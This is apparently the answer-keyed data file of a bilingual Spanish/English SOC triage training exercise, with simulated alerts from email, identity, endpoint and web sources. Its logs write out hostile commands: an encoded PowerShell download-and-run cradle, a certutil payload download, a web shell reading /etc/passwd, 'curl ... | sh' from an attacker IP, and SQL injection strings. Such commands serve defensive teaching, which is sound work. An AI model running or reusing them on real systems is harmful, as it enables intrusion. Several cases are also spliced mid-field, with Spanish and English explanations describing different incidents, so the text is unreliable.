Transportes Ibarra falla SPF desde ayer.","en":"Transportes Ibarra's monthly email fails SPF since yesterday."},"logs":[["09:46:02","mail","delivered from=admin@transportes-ibarra.example to=p.sanz@nortelogistica.example subject='Liquidacion octubre' spf=softfail dkim=pass(d=transportes-ibarra.example) dmarc=pass(dkim) attachment=liquidacion_octubre.pdf"],["09:46:03","sandbox","liquidacion_octubre.pdf verdict=clean macros=none links=0"],["09:46:05","mail","historico remitente: 14 correos en 12 meses, mismo asunto mensual"],["09:46:10","dns","SPF transportes-ibarra.example: v=spf1 include:_spf.anterior-proveedor.example -all (no incluye el nuevo servidor 192.0.2.140)"]],"ruido":{"fuentes":["mail","dns"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"mecanismo","label":{"es":"Mecanismo que sí valida el remitente","en":"Mechanism that does validate the sender"},"ok":["dkim"]}],"mitre":null,"claves":["dkim","spf"],"competencias":["triaje","correo","comunicacion"],"explica":{"es":"DKIM firma con el dominio del proveedor y DMARC pasa gracias a esa firma; el PDF está limpio y el envío es el habitual. El SPF falla porque el proveedor cambió de servidor de correo y no actualizó su registro. Es benigno: se cierra y se avisa al proveedor para que corrija su SPF.","en":"DKIM signs with the supplier's domain and DMARC passes thanks to that signature; the PDF is clean and the sending pattern is the usual one. SPF fails because the supplier changed mail server and did not update its record. Benign: close it and tell the supplier to fix their SPF."}},{"id":"T2-04","hora":"10:30","sev":"alta","fuente":"Entra ID","regla":{"es":"Muchas solicitudes de MFA denegadas","en":"Many denied MFA requests"},"titulo":{"es":"Lluvia de notificaciones de MFA a un usuario","en":"A burst of MFA pushes to one user"},"resumen":{"es":"l.moreno recibe más de 10 solicitudes de aprobación en pocos minutos.","en":"l.moreno gets more than 10 approval requests within minutes."},"logs":[["10:21:05","entra","SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140 geo=?,NL app=Office365"],["10:22:40","entra","SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140 (x12 en 7m)"],["10:28:58","entra","SignIn result=mfa_denied user=l.moreno@nortelogistica.example ip=198.51.100.140"],["10:29:31","entra","SignIn result=success user=l.moreno@nortelogistica.example ip=198.51.100.140 mfa=approved_push device=unregistered"],["10:30:02","entra","AuditLog action='Register security info' user=l.moreno method=authenticator_app ip=198.51.100.140"]],"ruido":{"fuentes":["entra"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ip","label":{"es":"IP del atacante","en":"Attacker IP"},"ok":["198.51.100.140"]},{"i ,"en":"Read permission granted"},"ok":["Mail.Read"]}],"mitre":"T1528","claves":["PDF Converter Pro","Mail.Read"],"competencias":["triaje","identidad","correo","respuesta"],"explica":{"es":"Un conversor de PDF no necesita leer ni enviar correo. Con «offline_access» la aplicación sigue entrando aunque p.sanz cambie la contraseña, y ya ha descargado 500 mensajes. Se contiene revocando el consentimiento y deshabilitando la aplicación; se escala para valorar qué datos salieron.","en":"A PDF converter has no need to read or send mail. With «offline_access» the app keeps access even if p.sanz changes her password, and it has already pulled 500 messages. Contain by revoking consent and disabling the app; escalate to assess what data left."}},{"id":"T2-06","hora":"12:00","sev":"baja","fuente":"Correo","regla":{"es":"Envío masivo desde un buzón interno","en":"Mass mailing from an internal mailbox"},"titulo":{"es":"Más de 4 000 correos salientes en una hora","en":"Over 4,000 outbound emails in an hour"},"resumen":{"es":"El buzón marketing@ supera el umbral de envíos.","en":"The marketing@ mailbox exceeds the sending threshold."},"logs":[["11:30:00","itsm","REQ-3307 aprobado: boletín de noviembre · plataforma envios.example · envío programado 11:45 · 4 800 destinatarios con consentimiento"],["11:45:02","mail","relay from=marketing@nortelogistica.example via=envios.example recipients=4800 subject='Novedades de noviembre' dkim=pass(d=nortelogistica.example)"],["11:58:40","mail","bounces=37 complaints=2 unsubscribes=11"]],"ruido":{"fuentes":["mail"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"peticion","label":{"es":"Petición que lo autoriza","en":"Request that authorises it"},"ok":["REQ-3307"]},{"id":"plataforma","label":{"es":"Plataforma de envío","en":"Sending platform"},"ok":["envios.example"]}],"mitre":null,"claves":["REQ-3307","envios.example"],"competencias":["triaje","correo","comunicacion"],"explica":{"es":"Coinciden la petición aprobada, la plataforma, la hora y el número de destinatarios, y el correo va firmado con DKIM de la empresa. Es el boletín mensual: benigno. Se cierra con REQ-3307 y se sugiere que marketing avise antes al SOC.","en":"The approved request, platform, time and recipient count all match, and the mail is DKIM-signed by the company. It is the monthly newsletter: benign. Close with REQ-3307 and suggest marketing gives the SOC a heads-up next time."}},{"id":"T2-07","hora":"12:45","sev":"alta","fuente":"Correo","regla":{"es":"Posible fraude del CEO","en":"Possible CEO fraud"},"titulo":{"es":"El «director» pide una transferencia urgente","en":"The «director» asks for an urgent transfer"},"resumen":{"es":"Correo a Finanzas con palabras clave de urgencia y cambio de cuenta bancaria.","en":"Email to Finance with urgency keywords and a bank account change."},"logs":[["12:38:20","mail","delivered from='David Vela' <d.vela@norte-logistica.example> to=p.sanz@nortelogistica.example subject='Urgente y confidencial' spf=pass dkim=pass(d=norte-logistica.example) body_kw='transferencia,hoy,nuevo IBAN,no comentes'"],["12:41:05","mail","sent from=p.sanz@nortelogistica.example to=d.vela@norte-logistica.example subject='RE: Urgente y confidencial' body='Lo preparo ahora mismo'"],["12:43:00","whois","norte-logistica.example creado hace 6 dias"],["12:43:10","ad","d.vela@nortelogistica.example (director general) · agenda: en vuelo Madrid-Ciudad de Mexico hasta las 21:00"]],"ruido":{"fuentes":["mail"],"n":12},"veredicto":"vp","accion":"escalar","campos":[{"id":"dominio","label":{"es":"Dominio suplantador","en":"Impersonating domain"},"ok":["norte-logistica.example"]},{"id":"victima","label":{"es":"Persona a la que piden la transferencia","en":"Person asked to make the transfer"},"ok":["p.sanz"]}],"mitre":"T1656","claves":["norte-logistica.example","p.sanz","transferencia"],"competencias":["triaje","correo","comunicacion"],"explica":{"es":"El dominio lleva un guion que el real no tiene y se creó hace seis días; el director está volando. SPF y DKIM pasan porque el atacante controla su propio dominio: pasar la autenticación no significa que sea legítimo. Lo urgente no es técnico: escalar ya para que Finanzas pare la transferencia por teléfono y bloquear el dominio.","en":"The domain has a hyphen the real one lacks and was registered six days ago; the director is on a plane. SPF and DKIM pass because the attacker controls their own domain: passing authentication does not make it legitimate. The urgent part is not technical: escalate now so Finance stops the transfer by phone, and block the domain."}},{"id":"T2-08","hora":"14:20","sev":"alta","fuente":"Correo","regla":{"es":"Regla de reenvío a dominio externo","en":"Forwarding rule to an external domain"},"titulo":{"es":"Un buzón de Finanzas reenvía todo a una dirección externa","en":"A Finance mailbox forwards everything to an external address"},"resumen":{"es":"Se crea una regla de bandeja de entrada en el buzón de m.ortega.","en":"An inbox rule is created on m.ortega's mailbox."},"logs":[["14:16:02","entra","SignIn result=success user=m.ortega@nortelogistica.example app=OWA ip=203.0.113.99 device=unknown"],["14:17:30","exchange","New-InboxRule mailbox=m.ortega name='.' ForwardTo=m.ortega.personal@correo.example DeleteMessage=True ip=203.0.113.99"],["14:18:00","exchange","forwarded messages=3 to=m.ortega.personal@correo.example"]],"ruido":{"fuentes":["entra","mail"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"destino","label":{"es":"Dirección de destino","en":"Destination address"},"ok":["m.ortega.personal@correo.example"]},{"id":"ip","label":{"es":"IP desde la que se crea","en":"IP it was created from"},"ok":["203.0.113.99"]}],"mitre":"T1114.003","claves":["203.0.113.99","m.ortega.personal@correo.example"],"competencias":["triaje","correo","identidad","respuesta"],"explica":{"es":"La IP es la misma del C2 del adjunto con macros de esta mañana (T2-02): el atacante robó la sesión de m.ortega y ahora se queda con su correo. La regla se llama «.» y borra los originales para que no se note. Contener: eliminar la regla, revocar sesiones y cambiar la contraseña, y enlazar este ticket con el de T2-02.","en":"The IP is the same C2 from this morning's macro attachment (T2-02): the attacker stole m.ortega's session and is now taking her mail. The rule is named «.» and deletes the originals so nobody notices. Contain: delete the rule, revoke sessions, reset the password, and link this ticket to T2-02."}}]},"t3":{"id":"T3","dia":{"es":"Miércoles","en":"Wednesday"},"tema":{"es":"Equipos y procesos","en":"Endpoints and processes"},"casos":[{"id":"T3-01","hora":"08:20","sev":"alta","fuente":"EDR","regla":{"es":"PowerShell con comando codificado","en":"PowerShell with encoded command"},"titulo":{"es":"PowerShell oculto con un comando en Base64","en":"Hidden PowerShell with a Base64 command"},"resumen":{"es":"PC-ALM-021 ejecuta powershell.exe con -enc y ventana oculta.","en":"PC-ALM-021 runs powershell.exe with -enc and a hidden window."},"logs":[["08:17:02","edr","process=wscript.exe parent=explorer.exe user=l.moreno host=PC-ALM-021 file=C:\\Users\\l.moreno\\Downloads\\albaran.js"],["08:17:04","edr","process=powershell.exe parent=wscript.exe user=l.moreno host=PC-ALM-021 cmd='powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEALgBwAHMAMQAnACkA'"],["08:17:05","fw01","ALLOW tcp 10.20.2.21:52011 -> 198.51.100.66:80"],["08:17:06","proxy01","user=l.moreno GET http://198.51.100.66/a.ps1 200 bytes=14882 category=uncategorized"]],"ruido":{"fuentes":["edr","proxy","fw"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"url","label":{"es":"URL que descarga (decodifica el Base64)","en":"URL it downloads (decode the Base64)"},"ok":["http://198.51.100.66/a.ps1"]},{"id":"padre","label":{"es":"Proceso padre de PowerShell","en":"PowerShell's parent process"},"ok":["wscript.exe"]}],"mitre":"T1059.001","claves":["198.51.100.66","PC-ALM-021","wscript"],"competencias":["triaje","endpoint","logs","respuesta"],"explica":{"es":"El Base64 de -enc va en UTF-16LE: decodificado dice IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), es decir, descargar y ejecutar en memoria. Lo lanza un .js de Descargas abierto con wscript, y el proxy confirma la descarga. Aislar PC-ALM-021 y bloquear la IP. Decodificar comandos es tarea diaria de un N1.","en":"The -enc Base64 is UTF-16LE: decoded it reads IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.66/a.ps1'), i.e. download and run in memory. A .js from Downloads opened with wscript launches it, and the proxy confirms the download. Isolate PC-ALM-021 and block the IP. Decoding commands is daily work for tier 1."}},{"id":"T3-02","hora":"09:00","sev":"alta","fuente":"EDR","regla":{"es":"Binario del sistema usado para descargar","en":"System binary used to download"},"titulo":{"es":"certutil descarga un ejecutable","en":"certutil downloads an executable"},"resumen":{"es":"certutil.exe con -urlcache en PC-FIN-007.","en":"certutil.exe with -urlcache on PC-FIN-007."},"logs":[["08:57:44","edr","process=certutil.exe parent=cmd.exe user=soporte$ host=PC-FIN-007 cmd='certutil -urlcache -split -f http://203.0.113.12/upd.exe C:\\Users\\Public\\upd.exe'"],["08:57:45","fw01","ALLOW tcp 10.20.3.41:50433 -> 203.0.113.12:80"],["08:57:47","edr","file_create host=PC-FIN-007 path=C:\\Users\\Public\\upd.exe sha256=9f2c...e01a signed=false"],["08:58:02","edr","process=upd.exe parent=cmd.exe user=soporte$ host=PC-FIN-007"]],"ruido":{"fuentes":["edr","fw"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ruta","label":{"es":"Ruta del fichero descargado","en":"Path of the downloaded file"},"ok":["C:\\Users\\Public\\upd.exe"]},{"id":"cuenta","label":{"es":"Cuenta que lo ejecuta","en":"Account running it"},"ok":["soporte$"]}],"mitre":"T1105","claves":["upd.exe","203.0.113.12","soporte$"],"competencias":["triaje","endpoint","respuesta"],"explica":{"es":"certutil sirve para certificados, pero los atacantes lo usan para descargar porque viene firmado por Microsoft (un «LOLBin»). Lo ejecuta soporte$, la cuenta creada el lunes en este mismo equipo (T1-04): el compromiso de PC-FIN-007 avanza. Aislar, bloquear 203.0.113.12 y enlazar con T1-04.","en":"certutil is for certificates, but attackers use it to download because Microsoft signs it (a «LOLBin»). It runs as soporte$, the account created on Monday on this same PC (T1-04): the PC-FIN-007 compromise is progressing. Isolate, block 203.0.113.12 and link to T1-04."}},{"id":"T3-03","hora":"09:45","sev":"media","fuente":"EDR","regla":{"es":"Ejecución remota con PsExec","en":"Remote execution with PsExec"},"titulo":{"es":"PsExec contra varios equipos a la vez","en":"PsExec against several hosts at once"},"resumen":{"es":"adm.rvela usa PsExec desde PAW-01 contra 14 equipos.","en":"adm.rvela uses PsExec from PAW-01 against 14 hosts."},"logs":[["09:30:00","itsm","CHG-2077 aprobado: despliegue del agente de inventario v4.2 en Almacen · responsable adm.rvela · metodo PsExec · ventana 09:30-10:30"],["09:41:10","edr","process=PsExec64.exe parent=powershell.exe user=adm.rvela host=PAW-01 signer='Microsoft Corporation' cmd='PsExec64 @almacen.txt -s msiexec /i \\\\SRV-FS01\\deploy\\inventario-4.2.msi /qn'"],["09:41:12","win-PC-ALM-014","EventID=7045 ServiceName=PSEXESVC ImagePath=%SystemRoot%\\PSEXESVC.exe AccountName=LocalSystem"],["09:43:50","edr","summary PsExec targets=14 hosts=PC-ALM-* result=ok"]],"ruido":{"fuentes":["edr","win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"cambio","label":{"es":"Cambio que lo autoriza","en":"Change that authorises it"},"ok":["CHG-2077"]}],"mitre":null,"claves":["CHG-2077","adm.rvela","PAW-01"],"competencias":["triaje","endpoint","comunicacion"],"explica":{"es":"PsExec es la misma herramienta que usan los at RV-FS01 y PC-FIN-007, deshabilitar soporte$ y escalar como incidente con todos los tickets enlazados.","en":"comsvcs.dll MiniDump against lsass.exe's PID is credential dumping: whoever has d.dmp has the secrets of everyone logged on to SRV-FS01. The session comes from 10.20.3.41 (PC-FIN-007) as soporte$. Critical: isolate SRV-FS01 and PC-FIN-007, disable soporte$ and escalate as an incident with every ticket linked."}},{"id":"T3-05","hora":"11:00","sev":"media","fuente":"SIEM","regla":{"es":"Tarea programada creada desde la línea de comandos","en":"Scheduled task created from the command line"},"titulo":{"es":"Tarea programada que ejecuta un binario de C:\\Users\\Public","en":"Scheduled task running a binary from C:\\Users\\Public"},"resumen":{"es":"Evento 4698 en PC-FIN-007 con un nombre que imita a OneDrive.","en":"Event 4698 on PC-FIN-007 with a name mimicking OneDrive."},"logs":[["10:58:12","win-PC-FIN-007","EventID=4688 CommandLine='schtasks /create /tn OneDriveUpdate /tr C:\\Users\\Public\\upd.exe /sc onlogon /ru SYSTEM' SubjectUserName=soporte$"],["10:58:12","win-PC-FIN-007","EventID=4698 TaskName=\\OneDriveUpdate SubjectUserName=soporte$"],["10:58:30","edr","baseline: OneDrive legitimo se actualiza con 'OneDrive Standalone Update Task-S-1-5-21...' desde %LocalAppData%\\Microsoft\\OneDrive"]],"ruido":{"fuentes":["win","edr"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"tarea","label":{"es":"Nombre de la tarea","en":"Task name"},"ok":["OneDriveUpdate","\\OneDriveUpdate"]},{"id":"binario","label":{"es":"Binario que ejecuta","en":"Binary it runs"},"ok":["C:\\Users\\Public\\upd.exe","upd.exe"]}],"mitre":"T1053.005","claves":["OneDriveUpdate","upd.exe"],"competencias":["triaje","endpoint","respuesta"],"explica":{"es":"La tarea imita a OneDrive pero ejecuta como SYSTEM el upd.exe descargado con certutil (T3-02) en cada inicio de sesión: es persistencia. La legítima tiene otro nombre y otra ruta. Contener: borrar la tarea y el binario forma parte de an de respuesta. El aviso a dirección lo da el N2 o el responsable de incidentes.","en":"Ransomware in progress: it encrypts over the network from 10.20.3.41 (PC-FIN-007) as soporte$, drops a ransom note and tries to delete backup shadow copies. Every minute counts: isolate PC-FIN-007 and SRV-FS01, disable soporte$ and trigger the response plan. Tier 2 or the incident lead informs management."}},{"id":"T3-08","hora":"13:50","sev":"media","fuente":"SIEM","regla":{"es":"RDP interno poco habitual","en":"Unusual internal RDP"},"titulo":{"es":"Un técnico abre RDP contra la base de datos","en":"A technician opens RDP to the database"},"resumen":{"es":"Primera conexión RDP de h.diaz a SRV-SQL01 en 90 días.","en":"First RDP connection from h.diaz to SRV-SQL01 in 90 days."},"logs":[["13:40:00","itsm","INC-5521 asignado a h.diaz: 'SRV-SQL01 sin espacio en C:, la aplicación de pedidos no guarda' · prioridad alta"],["13:47:20","win-SRV-SQL01","EventID=4624 LogonType=10 TargetUserName=h.diaz IpAddress=10.20.6.8 WorkstationName=PC-SOP-002"],["13:49:05","win-SRV-SQL01","EventID=4688 NewProcessName=cleanmgr.exe SubjectUserName=h.diaz"],["13:55:40","itsm","INC-5521 nota: 'liberados 18 GB de registros antiguos, aplicación operativa'"]],"ruido":{"fuentes":["win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"ticket","label":{"es":"Ticket que lo justifica","en":"Ticket that explains it"},"ok":["INC-5521"]}],"mitre":null,"claves":["INC-5521","h.diaz"],"competencias":["triaje","identidad","comunicacion"],"explica":{"es":"Lo raro no siempre es malo: h.diaz tiene asignada una incidencia urgente justo en ese servidor, entra desde su equipo de soporte y lo que hace (liberar disco) encaja con el ticket. Benigno, cerrado con INC-5521. Después de lo que ha pasado esta semana, conviene comprobarlo siempre antes de cerrar.","en":"Unusual is not always bad: h.diaz has an urgent incident assigned on exactly that server, connects from his helpdesk PC and what he does (free disk space) matches the ticket. Benign, closed with INC-5521. After this week, it is worth checking every time before closing."}}]},"t4":{"id":"T4","dia":{"es":"Jueves","en":"Thursday"},"tema":{"es":"Red y aplicaciones web","en":"Network and web apps"},"casos":[{"id":"T4-01","hora":"08:10","sev":"media","fuente":"WAF","regla":{"es":"Firmas de inyección SQL","en":"SQL injection signatures"},"titulo":{"es":"Intentos de inyección SQL contra el portal de clientes","en":"SQL injection attempts against the customer portal"},"resumen":{"es":"El WAF registra peticiones con UNION SELECT y comillas contra /pedidos.","en":"The WAF logs requests with UNION SELECT and quotes against /pedidos."},"logs":[["08:05:11","waf","block GET /pedidos?id=1' OR '1'='1 from 198.51.100.200 rule=942100 status=403"],["08:05:12","waf","block GET /pedidos?id=1 UNION SELECT usuario,clave FROM clientes-- from 198.51.100.200 rule=942190 status=403"],["08:06:30","waf","summary src=198.51.100.200 requests=212 blocked=212 status_200=0 ua='sqlmap/1.8'"],["08:07:00","web-SRV-WEB01","sin peticiones de 198.51.100.200 en el servidor de aplicaciones (todas paradas en el WAF)"]],"ruido":{"fuentes":["waf","web"],"n":12},"veredicto":"vp","accion":"cerrar","campos":[{"id":"estado","label":{"es":"Código HTTP que recibió el atacante","en":"HTTP status the attacker got"},"ok":["403"]},{"id":"herramienta","label":{"es":"Herramienta que usa","en":"Tool being used"},"ok":["sqlmap"]}],"mitre":"T1190","claves":["198.51.100.200","403","sqlmap"],"competencias":["triaje","red","logs"],"explica":{"es":"Es un ataque real con sqlmap (verdadero positivo), pero las 212 peticiones recibieron 403 y ninguna llegó al servidor. El control funcionó: se documenta, se bloquea la IP si la política lo pide y se cierra. Lo que obligaría a escalar es un solo 200 con firma de inyección.","en":"It is a real sqlmap attack (true positive), but all 212 requests got 403 and none reached the server. The control worked: document it, block the IP if policy says so, and close. What would force an escalation is a single 200 with an injection signature."}},{"id":"T4-02","hora":"08:55","sev":"critica","fuente":"WAF","regla":{"es":"Ejecución de comandos en parámetro web","en":"Command execution in a web parameter"},"titulo":{"es":"Un fichero subido responde a comandos del sistema","en":"An uploaded file answers system commands"},"resumen":{"es":"Peticiones con ?cmd= a un .php dentro de /uploads/ devuelven 200.","en":"Requests with ?cmd= to a .php under /uploads/ return 200."},"logs":[["08:49:02","web-SRV-WEB01","203.0.113.150 - - \"POST /perfil/avatar HTTP/1.1\" 200 512 file=avatar.php content-type=image/png"],["08:50:40","web-SRV-WEB01","203.0.113.150 - - \"GET /uploads/avatar.php?cmd=whoami HTTP/1.1\" 200 21"],["08:51:15","web-SRV-WEB01","203.0.113.150 - - \"GET /uploads/avatar.php?cmd=cat%20/etc/passwd HTTP/1.1\" 200 1840"],["08:53:02","edr","process=sh parent=php-fpm user=www-data host=SRV-WEB01 cmd='curl -s http://203.0.113.150/k | sh'"]],"ruido":{"fuentes":["web","waf"],"n":12},"veredicto":"vp","accion":"contener","campos":[{"id":"ruta","label":{"es":"Ruta del web shell","en":"Web shell path"},"ok":["/uploads/avatar.php"]},{"id":"ip","label":{"es":"IP del atacante","en":"Attacker IP"},"ok":["203.0.113.150"]}],"mitre":"T1505.003","claves":["/uploads/avatar.php","203.0.113.150"],"competencias":["triaje","red","logs","respuesta"],"explica":{"es":"El formulario de avatar aceptó un .php declarado como imagen, y ahora ese fichero ejecuta comandos (200 con contenido) y ya descarga una segunda fase. Es un web shell activo en el servidor público: contener aislando SRV-WEB01 o retirándolo del balanceador, bloquear la IP y escalar como incidente.","en":"The avatar form accepted a .php declared as an image, and now that file runs commands (200 with content) and is already pulling a second stage. It is a live web shell on the public server: contain by isolating SRV-WEB01 or pulling it from the load balancer, block the IP and escalate as an incident."}},{"id":"T4-03","hora":"09:35","sev":"media","fuente":"SIEM","regla":{"es":"Escaneo interno de puertos","en":"Internal port scan"},"titulo":{"es":"Un equipo interno recorre toda la red","en":"An internal host sweeps the whole network"},"resumen":{"es":"10.20.5.15 conecta con 250 equipos y miles de puertos.","en":"10.20.5.15 touches 250 hosts and thousands of ports."},"logs":[["07:00:00","itsm","CHG-2090 aprobado: escaneo trimestral de vulnerabilidades · origen SCAN-01 (10.20.5.15) · alcance 10.20.0.0/16 · ventana 07:00-12:00"],["09:31:10","fw02","ALLOW tcp 10.20.5.15:44102 -> 10.20.2.0/24 ports=1-1024 count=6144"],["09:33:40","win-SRV-FS01","EventID=4625 TargetUserName=svc_scan IpAddress=10.20.5.15 LogonType=3 (credencial de escaneo autenticado, contraseña rotada ayer)"],["09:34:10","scan01","Nessus 10.8 scan='Trimestral Q4' status=running hosts_done=118/250"]],"ruido":{"fuentes":["fw","win"],"n":12},"veredicto":"benigno","accion":"cerrar","campos":[{"id":"cambio","label":{"es":"Cambio que lo autoriza","en":"Change that authorises it"},"ok":["CHG-2090"]},{"id":"cuenta","label":{"es":"Cuenta con fallos de inicio de sesión","en":"Account with failed logons"},"ok":["svc_scan"]}],"mitre":null,"claves":["CHG-2090","SCAN-01"],"competencias":["triaje","red","comunicacion"],"explica":{"es":"Origen, alcance y ventana coinciden con CHG-2090: es el escaneo trimestral, benigno. Pero hay un detalle útil: svc_scan falla al autenticarse porque su contraseña se rotó ayer, así que el escaneo autenticado saldrá incompleto. Se cierra y se avisa a IT. Así aporta valor un buen N1.","en":"Source, scope and window match CHG-2090: it is the quarterly scan, benign. But there is a useful detail: svc_scan fails to authenticate because its password was rotated yesterday, so the credentialed scan will be incomplete. Close it and tell IT. That is how a good tier 1 adds value."}},{"id":"T4-04","hora":"10:15","sev":"alta","fuente":"SIEM","regla":{"es":"Comunicación periódica
